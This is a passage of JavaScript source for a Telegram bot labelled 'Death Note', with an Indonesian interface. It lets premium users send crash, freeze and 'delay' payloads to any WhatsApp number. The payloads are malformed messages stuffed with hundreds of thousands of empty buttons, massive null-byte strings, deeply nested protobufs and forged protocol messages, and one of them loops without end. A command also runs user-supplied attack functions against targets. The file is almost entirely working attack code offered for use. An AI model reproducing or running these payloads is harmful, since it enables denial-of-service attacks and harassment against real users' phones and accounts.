<blockquote><b>𝙳𝙴𝙰𝚃𝙷 𝙽𝙾𝚃𝙴</b></blockquote>
↯ Developer  : @lawlietni
↯ Version    : 7.0 hight
↯ Platform   : Telegram
↯ type script : Bebas spam bugs 

<blockquote><b>𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑺͒𝒆͢𝒏͠𝒅𝒆͒𝒓͢</b></blockquote>
↯ /addsender - menambahkan sender agar bisa menggunakan fitur bot
↯ /resetsession - mereset sesi/akses sender
<blockquote><b>𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑨͒𝒅͢𝒎͠𝒊𝒏͒</b></blockquote>
↯ /addadmin - menambahkan admin bot
↯ /deladmin - menghapus admin bot
<blockquote><b>𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑼͒𝒔͢𝒆͠𝒓͒͒</b></blockquote>
↯ /addprem - menambahkan user ke premium
↯ /delprem - menghapus user dari premium
<blockquote><b>𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑴͒𝒖͢𝒓͠𝒃𝒖͒𝒈͢</b></blockquote>
↯ /addpremgrup - menambahkan grup ke akses premium
↯ /delpremgrup - menghapus grup dari premium
`;
      
    const keyboard = [
        [
            {
                text: "🔙 ☇ ターゲット",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Error in /controls action:", error);
        }
    }
});

bot.action("/bug", async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bugMenu = `
<blockquote><b>𝙳𝙴𝙰𝚃𝙷 𝙽𝙾𝚃𝙴</b></blockquote>
↯ Developer  : @lawlietni
↯ Version    : 7.0 hight
↯ Platform   : Telegram
↯ type script : Bebas spam bugs 
<blockquote><b>𝑨͒𝒏͠𝒅͢𝒓𝒐͠𝒊͢𝒅 𝑩͒𝒖͠𝒈͢𝒔</b></blockquote>
⌬/nintersOrder  - delay hard level
⌬/inTs - delay brutality
⌬/delaymahjong - delay freeze
⌬/xfreeze - delay invisibleXFreeze chat
<blockquote><b>𝑺͒𝒑͠𝒆͢𝒔͠𝒊͢𝒂͠𝒍 𝑩͒𝒖͠𝒈͢𝒔</b></blockquote>
⌬/forceclose - forceclose invisible
⌬/crashnew - crash invisible new
`;

    const keyboard = [
        [
            {
                text: "🔙 ☇ ターゲット",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Error in /bug action:", error);
        }
    }
});

bot.command("forceclose", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /forceclose 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
  ✅ forceclose (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 13; i++) {
    await ForceClose(sock, target);
    await sleep(1000);
  }

});

bot.command("crashnew", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /crashnew 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
  ✅ crashnew (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 17; i++) {
    await CrashD(sock, target);
  }

});

bot.command("nintersOrder", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /nintersOrder 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const mention = true;
  
  await ctx.reply(`
  ✅ nintersOrder (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 10; i++) {
    await ObxDelayCrotSange(sock, target);
  }

});

bot.command("delaymahjong", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /delaymahjong 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const mention = true;
  
  await ctx.reply(`
  ✅ delaymahjong (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 10; i++) {
    await ReymonOBX(sock, target);
  }

});

bot.command("xfreeze", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /xfreeze 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const mention = true;
  
  await ctx.reply(`
  ✅ xfreeze (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 12; i++) {
    await ReymonOBXCrash(sock, target);
  }

});

bot.command("inTs", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /inTs 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const mention = true;
  
  await ctx.reply(`
  ✅ inTs (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 10; i++) {
    await HaloBang(sock, target);
  }

});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<<blockquote>⬡═―—⊱ ⎧ 𝗡𝗘𝗫𝗬𝗥𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>⬡═―—⊱ ⎧ 𝗡𝗘𝗫𝗬𝗥𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

// Function Bug
async function HaloBang(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "ReymonNotDev", 
          previewType: 6,
          contextInfo: {
            mentionedJid: Array.from({ length: 100 }, (_, z) => `628${z + 1}@s.whatsapp.net`)
          },
          paymentLinkMetadata: {
            button: {
              displayText: "HELLO DENGAN PT OBX"
            }, 
            header: {
              headerType: 2
            }, 
            provider: {
              paramsJson: "{".repeat(10000) 
            }
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target }
  }) 
}

async function ReymonOBX(sock, target) {
    await sock.relayMessage(
        target,
        {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\x10"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        },
        {}
    );
}

async function ReymonOBXCrash(sock, target) {
    const repeat = 1000000;
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "ꦾꦾꦾꦾꦾꦾꦾꦾ",
                        display_text: "\u200C" + "\u200D" + "\u200B" + "\u200A" + "\u0000" + "\x930" + "\u200B"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    nativeFlowResponsMessage: {
                        buttons: [
                            { name: "one_crash_message" },
                            {
                                name: "booking_status",
                                bookingId: "succes"
                            },
                            {
                                name: "voice_call",
                                phone_number: "6200000000"
                            },
                            { name: "cta_copy" }
                        ]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, {});
}

async function ForceClose(sock, target) {
  try {
    const msg = {
      groupMentionedMessage: {
        message: {
          ephemeralMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    body: {
                      text: "Angkaßphz🥷"
                    },
                    nativeFlowMessage: {
                      extra: "\u3104",
                      buttons: "ꦾ࣯࣯".repeat(20000),
                      extra1: "ꦾ࣯࣯".repeat(5555)
                    }
                  }
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, {});
  } catch (e) {
    console.log("❌ ERROR:", e.message);
  }
}

async function CrashD(sock, target) {
  const msg1 = "ꦽ".repeat(1000);

  const msg2 = [
    [0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02],
    [0x9A, 0x03], [0xE2, 0x05], [0xC2, 0x06],
    [0x8A, 0x07], [0xF2, 0x08], [0xCA, 0x09],
    [0xB2, 0x0A], [0xDA, 0x0B], [0xA2, 0x0C],
    [0xEA, 0x0D], [0x92, 0x0E], [0xFA, 0x0F],
    [0x82, 0x10], [0x8A, 0x11], [0xF2, 0x12],
  ];

  const msg3 = (n) => {
    const buf = [];
    while (n >= 0x80) { buf.push((n & 0x7f) | 0x80); n >>>= 7; }
    buf.push(n);
    return Buffer.from(buf);
  };

  const msg4 = (tag, data) =>
    Buffer.concat([Buffer.from(tag), msg3(data.length), data]);

  const msg5 = (data) => {
    return msg4([0x0A], msg4([0x12], msg4([0x1A], msg4([0x22], msg4([0x2A], data)))));
  };

  const msg6 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "oh yo bg" + "ꦾ".repeat(30000) },
          nativeFlowMessage: {
            name: "carousel_message",
            buttons: [],
            cards: Array.from({ length: 30 }, () => ({}))
          },
          contextInfo: {
            remoteJid: "@s.whatsapp.net",
            statusAttributionType: 9999,
            mentionedJid: Array.from(
              { length: 2000 },
              () => Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
            )
          }
        }
      }
    }
  };

  const msg7 = proto.Message.encode(
    proto.Message.fromObject({ messagepayload: msg6 })
  ).finish();

  const msg8 = (tag, depth) => {
    let buf = msg7;
    for (let i = 0; i < depth; i++) {
      buf = msg5(msg4(tag, msg4([0x0A], buf)));
    }
    return buf;
  };

  const msg9 = (depth) => {
    let buf = msg7;
    for (let i = 0; i < depth; i++) {
      buf = msg4([0x0A], buf);
    }
    return buf;
  };

  let msg10 = 0;

  while (true) {
    msg10++;

    const msg11 = msg2[msg10 % msg2.length];

    const msg12 = 20000 + (msg10 % 50) * 500;

    let msg13 = null;
    try {
      const msg14 = proto.Message.decode(msg8(msg11, msg12));
      proto.Message.encode(msg14).finish();
      msg13 = msg14;
    } catch (_) {}

    let msg15 = null;
    try {
      const msg16 = proto.Message.decode(msg9(msg12 + 10000));
      proto.Message.encode(msg16).finish();
      msg15 = msg16;
    } catch (_) {}

    const msg17 = Array.from(
      { length: 200 },
      () => Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
    );

    const msg18 = {
      interactiveMessage: {
        header: {
          title: "Lekzo",
          subtitle: "Interactive",
          hasMediaAttachment: false
        },
        body: { text: msg1 },
        footer: { text: "© Lekzo" },
        nativeFlowMessage: {
          buttons: [],
          messageParamsJson: "{}"
        },
        contextInfo: {
          mentionedJid: msg17,
          isForwarded: true,
          forwardingScore: 999,
          expiration: 999999,
          ephemeralExpiration: 1,
          disappearingMode: {
            initiator: 1,
            trigger: 1,
            duration: 999999
          },
          remoteJid: "status@broadcast",
          participant: "0@s.whatsapp.net",
          quotedMessage: { conversation: "hai" }
        }
      }
    };

    const msg19 = {
      viewOnceMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "\u0000".repeat(50000) },
            nativeFlowMessage: {
              buttons: Array.from({ length: 100000 }, () => ({
                name: "\u0000".repeat(100),
                buttonParamsJson: "[".repeat(1000)
              }))
            },
            contextInfo: {
              mentionedJid: msg17,
              ephemeralExpiration: 1,
              quotedMessage: {
                interactiveMessage: {
                  body: { text: "\u0000".repeat(50000) },
                  contextInfo: {
                    quotedMessage: {
                      interactiveMessage: {
                        body: { text: "\u0000".repeat(50000) }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    const msg20 = {
      protocolMessage: {
        type: 0,
        appStateSyncKeyShare: {
          keys: Array.from({ length: 10000 }, () => ({
            keyId: { keyId: Buffer.alloc(32, 0xFF) },
            keyData: {
              keyData: Buffer.alloc(32, 0xAA),
              fingerprint: {
                rawId: 0xFFFFFFFF, currentIndex: 0xFFFFFFFF,
                deviceIndexes: [0xFFFFFFFF]
              },
              timestamp: 0x7FFFFFFFFFFFFFFF
            }
          }))
        }
      }
    };

    const msg21 = {
      protocolMessage: {
        type: 0,
        historySyncNotification: {
          fileSha256: Buffer.alloc(0),
          fileLength: "18446744073709551615",
          mediaKey: Buffer.alloc(0),
          fileEncSha256: Buffer.alloc(0),
          directPath: "/" + "\u0000".repeat(10000),
          syncType: 0xFF,
          chunkOrder: 0xFFFFFFFF,
          originalMessageId: "\u0000".repeat(1000),
          initialHistBootstrapInlinePayload: Buffer.alloc(65535, 0x00)
        }
      }
    };

    const msg22 = {
      viewOnceMessageV2: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/" + "\u0000".repeat(65535),
            mimetype: "audio/ogg; codecs=opus",
            fileSha256: Buffer.alloc(32, 0xFF),
            fileLength: "18446744073709551615",
            seconds: 0xFFFFFFFF,
            ptt: true,
            mediaKey: Buffer.alloc(32, 0xFF),
            fileEncSha256: Buffer.alloc(32, 0xFF),
            directPath: "/" + "\u0000".repeat(10000),
            mediaKeyTimestamp: 0x7FFFFFFFFFFFFFFF,
            waveform: Buffer.alloc(65535, 0xFF),
            streamingSidecar: Buffer.alloc(65535, 0x00),
            contextInfo: {
              mentionedJid: msg17,
              ephemeralExpiration: 1
            }
          }
        }
      }
    };

    const msg23 = {
      protocolMessage: {
        type: 0,
        voipPayload: {
          callId: "\u0000".repeat(65535),
          audioCodec: 0xFFFFFFFF,
          audioBitrate: 0xFFFFFFFF,
          audioSampleRate: 0xFFFFFFFF,
          audioChannels: 0xFFFFFFFF,
          ssrc: 0xFFFFFFFF,
          payloadType: 0xFFFFFFFF,
          srtpKey: Buffer.alloc(65535, 0xFF),
          srtpSalt: Buffer.alloc(65535, 0xFF)
        }
      }
    };

    const msg24 = [
      { viewOnceMessage: { message: msg18 } },
      msg19,
      msg20,
      msg21,
      msg22,
      msg23,
      msg13 || { viewOnceMessage: { message: msg18 } },
      msg15 || { viewOnceMessage: { message: msg18 } }
    ];

    for (let msg25 = 0; msg25 < msg24.length; msg25++) {
      const msg26 = "ModANN" + msg10 + "_" + msg25 + "_" +
        Math.random().toString(36).substring(2, 12).toUpperCase();

      try {
        await sock.relayMessage(target, msg24[msg25], {
          noSelfSync: true,
          messageId: msg26,
          participant: target
        });
      } catch (_) {}

      try {
        await sock.relayMessage("status@broadcast", msg24[msg25], {
          messageId: msg26 + "_S",
          statusJidList: [target],
          additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: [] }]
            }]
          }]
        });
      } catch (_) {}

      try {
        await sock.relayMessage(target + "@newsletter", msg24[msg25], {
          messageId: msg26 + "_N",
          noSelfSync: true
        });
      } catch (_) {}

      try {
        await sock.relayMessage(target, msg24[msg25], {
          messageId: msg26 + "_P",
          noSelfSync: true,
          participant: target,
          additionalAttributes: { device_fanout: "true" }
        });
      } catch (_) {}

      await new Promise(r => setTimeout(r, 120));
    }

    console.log(`[CrashD] iter ${msg10} | depth:${msg12} | Done Send To Target ✅`);

    await new Promise(r => setTimeout(r, 1000));
  }
}

async function ObxDelayCrotSange(sock, target) {
const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQOX8BndM04C2IKAvFpfPM8TH47RXFVzZAb-S3FhHo-SG2hxcK_6reQ3T7X5xWj2LKROTSn5-JBQyLC5I7rAxW_fGoECK5sXufZs8nH2XA?ccb=9-4&oh=01_Q5Aa5AFsLMbBRJ9c90mrz8rK0ozXpzA9e-YPgY85ciys7D5nIw&oe=6A752E63&_nc_sid=e6ed6c",
              mimetype: "image/jpeg",
              fileSha256: "mnm9afzvi752rKOhEqgJuoXGvAavp+/7B39edCSjs0M=",
              fileLength: "205830",
              height: 1254,
              width: 1254,
              mediaKey: "7TV3Nv0ZSIL0xILkNwiC2k09qsld0W1NCuvmyL8eT/o=",
              fileEncSha256: "G7zTiKFse8lAASW5UUcF3RlXGPEs5EDoymJgxLl4OsY=",
              directPath: "/o1/v/t24/f2/m231/AQOX8BndM04C2IKAvFpfPM8TH47RXFVzZAb-S3FhHo-SG2hxcK_6reQ3T7X5xWj2LKROTSn5-JBQyLC5I7rAxW_fGoECK5sXufZs8nH2XA?ccb=9-4&oh=01_Q5Aa5AFsLMbBRJ9c90mrz8rK0ozXpzA9e-YPgY85ciys7D5nIw&oe=6A752E63&_nc_sid=e6ed6c",
              mediaKeyTimestamp: "1783478072",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAADAQEBAQAAAAAAAAAAAAAAAwQBAgUGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADXc0Gds7E47ojVakjGgyhVJrDzxlnzHqnoJoUSnYYxNJ143uwnndR+0U61QgwE0xPLe5WCLVALEmCQQ0BzANwBagFAH//EACYQAAMAAQQBAwQDAAAAAAAAAAABAhEDBBIhFBAxQSIjQlFSYWL/2gAIAQEAAT8AUikmRScBwORoqSZJQpFI2lSn5ZgclSVJCJQ2pWX6O15sw/4GBopFIhEoRvN29pUvpp+6HutV7tbrg+CNtu/Lp/jK9KKIG7lNrv8ASPudNe2OzcPbY1OUNX/Yr01pxx6nPZpvaXHzzz1g0lqykqxgvPwWQyWI19r5V/X1MlbGvLWhyamlhsltbzpvKY2UUyGSxMyXpZ3unqf5Mj6rOSmUyWTRNCo5DodFUVRNComzmcx2VY6HR//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA"
              },
              scansSidecar: "gZPLDkqPqc67rjEO2tfcJ9zsSpwJtyEDblK/EUAsgXewUvWmHVgw5Q==",
              scanLengths: [11276, 34736, 50604, 109214],
              midQualityFileSha256: "sIRX95Bfzqy24VGF60QOGVeh7m1aIg5aphYxlT0UlPk="
            }
          },
          body: {
            text: "\0".repeat(50000) + "\20".repeat(40000)
          },
          nativeFlowMessage: {
            buttons: "\0".repeat(10000) + "\20".repeat(40000)
          }
        }
      }
    }
  };
  
  const msg1 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "\0".repeat(50000) + "\20".repeat(40000),
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            mentionedJid: [target],
            stickerMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
              fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
              mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
              mimetype: "image/webp",
              directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
              fileLength: "10610",
              mediaKeyTimestamp: "1775044724",
              stickerSentTs: "1775044724091"
            }
          }
        }
      }
    }
  };

const msg3 = {
 groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          locationMessage: {
            degreesLatitude: 9999,
            degreesLongitude: 9999,
            name: "駭客攻擊",
            address: "駭客攻擊",
            jpegThumbnail: "sex"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 300000 }, () => ({}))
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            )
          }
        }
      }
    }
  };
  
const msg4 = {
 groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          locationMessage: {
            degreesLatitude: 9999,
            degreesLongitude: 9999,
            name: "駭客攻擊",
            address: "駭客攻擊",
            jpegThumbnail: "sex"
          },
          body: {
            text: "\n" + "\r" + "\20" + "\0".repeat(90000)
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 300000 }, () => ({})),
            contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
              },
            forwardOrigin: 4,
            mentionedJid: [target]
           },
          }
        }
      }
    }
  };
  
  const msg5 = {
    groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "\x00\x01"
              },
              nativeFlowMessage: {
                buttons: Array.from({ length: 400000 }, () => ({})),
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  display_text: "\n".repeat(99999),
                  id: "\0".repeat(99999),
                  flow_token: "\r".repeat(99999)
                })
              }
            }
          }
        }
      };
      
 const msg6 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "\x00\x01\x02"
          },
          body: {
            text: "\x00\x01\x02"
          },
          nativeFlowMessage: {
                buttons: [
                  "628984627909@s.whatsapp.net",
                  ...Array.from({ length: 50000 })
                ],
                name: "\0"
              },
              nativeFlowMessage: {
                name: "address_message",
                buttons: "\0".repeat(250000) + "\0".repeat(250000)
              }
        }
      }
    }
  }
  
 await sock.relayMessage(target, msg, {});
 await sock.relayMessage(target, msg1, {});
 await sock.relayMessage(target, msg3, {});
 await sock.relayMessage(target, msg4, {});
 await sock.relayMessage(target, msg5, {});
 await sock.relayMessage(target, msg6, {});
 noSelfSync: true
}
// End Function Bug
bot.launch()
